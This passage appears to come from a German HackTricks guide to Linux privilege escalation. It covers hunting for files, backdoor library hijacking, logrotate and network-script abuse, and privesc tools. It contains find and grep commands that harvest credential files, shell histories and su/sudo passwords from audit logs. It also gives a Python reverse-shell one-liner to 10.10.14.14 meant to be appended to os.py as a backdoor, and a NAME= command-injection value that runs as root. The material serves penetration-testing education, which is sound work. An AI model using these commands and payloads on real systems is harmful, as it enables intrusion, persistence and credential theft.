### In den letzten Minuten geänderte Dateien
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binaries im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-Dateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), es durchsucht **verschiedene mögliche Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) welches eine Open-Source-Anwendung ist, die viele auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux & Mac ausliest.

### Logs

Wenn du Logs lesen kannst, kannst du möglicherweise **interessante/vertrauliche Informationen darin** finden. Je seltsamer das Log ist, desto interessanter wird es (wahrscheinlich).\
Auch können einige **schlecht** konfigurierte (backdoored?) **audit logs** es ermöglichen, Passwörter in audit logs **aufzuzeichnen**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um Logs zu lesen, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Sie sollten auch nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und außerdem nach IPs und E-Mails in Logs oder Hash-Regexps.\
Ich werde hier nicht aufzählen, wie man das alles macht, aber wenn Sie interessiert sind, können Sie die letzten Prüfungen ansehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.

## Schreibbare Dateien

### Python library hijacking

Wenn Sie wissen, von **wo** ein python-Skript ausgeführt wird und Sie **in diesen Ordner schreiben können** oder die **python libraries ändern können**, können Sie die OS-Library modifizieren und sie backdooren (wenn Sie an den Ort schreiben können, an dem das python-Skript ausgeführt wird, kopieren Sie die os.py library).

Um die **backdoor the library** vorzunehmen, fügen Sie einfach am Ende der os.py library die folgende Zeile hinzu (IP und PORT ändern):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-Ausnutzung

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **Schreibrechten** auf eine Logdatei oder deren übergeordnete Verzeichnisse, potenziell erhöhte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, das oft als **root** läuft, so manipuliert werden kann, dass es beliebige Dateien ausführt — insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

Detailliertere Informationen zur Schwachstelle finden sich auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Du kannst diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist der [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** sehr ähnlich. Wenn du also feststellen kannst, dass du Logs verändern kannst, prüfe, wer diese Logs verwaltet, und ob du durch Ersetzen der Logs mit symlinks Privilegien eskalieren kannst.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenz zur Schwachstelle:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus welchem Grund auch immer in der Lage ist, ein `ifcf-<whatever>`-Script nach _/etc/sysconfig/network-scripts_ zu **schreiben** oder ein bestehendes anzupassen, dann ist Ihr **System ist pwned**.

Network scripts, _ifcg-eth0_ zum Beispiel, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Sie werden jedoch unter Linux vom Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das `NAME=`-Attribut in diesen Network-Skripten nicht korrekt behandelt. Wenn du **Leerzeichen im Namen hast, versucht das System den Teil nach dem Leerzeichen auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Beachte das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
